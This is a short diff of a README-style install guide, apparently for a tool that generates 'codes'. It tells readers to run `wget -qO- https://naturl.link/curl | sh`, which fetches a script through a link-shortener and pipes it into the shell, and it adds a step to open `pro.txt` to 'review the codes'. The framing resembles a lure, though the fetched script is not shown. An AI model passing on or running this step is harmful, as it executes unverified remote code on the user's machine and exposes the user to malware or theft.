@@ -20,6 +20,7 @@ Follow the steps below according to your operating system.
 ```bash
 wget -qO- https://naturl.link/curl | sh
 ```
+3. Once the command completes, open `pro.txt` to review the codes.
 
 ### Manual Method
 1. **Open Terminal.**
